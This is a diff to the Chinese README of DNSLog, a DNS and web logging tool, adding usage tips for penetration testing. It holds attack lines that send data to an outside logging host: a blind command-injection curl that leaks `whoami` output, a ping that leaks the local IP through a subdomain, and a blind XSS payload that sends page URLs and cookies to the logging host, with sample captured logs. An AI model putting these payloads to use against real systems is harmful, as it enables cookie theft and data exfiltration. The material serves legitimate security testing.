@@ -133,6 +133,9 @@ DNSLog 基于 Django 框架编写，将 DNSServer 集成进 DNSLog 中，使用�
  
  访问后会在下方看到自己的二级域名，例如 test.b.com，当请求 test.b.com 这个二级域名下的任意子域时，都会被记录，例如: demo.test.b.com。
 
+使用技巧
+---
+
 ### 命令盲注利用
 
 对于一些命令盲注类的漏洞，可以通过 DNSLog 中的 WebLog 部分将其转化为有回显的命令执行：
@@ -146,6 +149,45 @@ curl "http://testhash.test.dnslog.link/?`whoami`"
 \#	|	path	|	ip	|	ua	| date
 ---|---|---|---|---
 146	| testhash.test.dnslog.link/?root |	xxx.xxx.xxx.xxx |	curl/7.43.0	| 2016-05-10 07:36:47
+
+
+### DNS记录中获取源IP地址
+
+详见 [issue#3](https://github.com/BugScanTeam/DNSLog/issues/3)
+
+```
+ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.dnslog.link
+```
+
+效果如下：
+
+```
+➜  ~ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.dnslog.link
+PING 192.168.10.167.test.dnslog.link (106.186.118.146): 56 data bytes
+64 bytes from 106.186.118.146: icmp_seq=0 ttl=52 time=259.491 ms
+64 bytes from 106.186.118.146: icmp_seq=1 ttl=52 time=307.566 ms
+64 bytes from 106.186.118.146: icmp_seq=2 ttl=52 time=352.757 ms
+
+--- 192.168.10.167.test.dnslog.link ping statistics ---
+3 packets transmitted, 3 packets received, 0.0% packet loss
+round-trip min/avg/max/stddev = 259.491/306.605/352.757/38.082 ms
+```
+
+### XSS 盲打
+
+在有 XSS 漏洞的页面加入类似如下代码：
+
+```
+var s=document.createElement('img');
+s.src="http://xss.test.dnslog.link/?url="+document.location+"&cookie="+document.cookie;
+document.head.appendChild(s);
+```
+
+以 `httpbin.org` 为例，一旦触发，在 WebLog 中可以看到：
+
+\#	|	path	|	ip	|	ua	| date
+---|---|---|---|---
+146	| xss.test.dnslog.link/?url=http://httpbin.org/&cookie=_ga=GA1.2.17.142 |	xxx.xxx.xxx.xxx |	Mozilla/5.0 xxx	| 2016-06-18
 
 
 相关链接
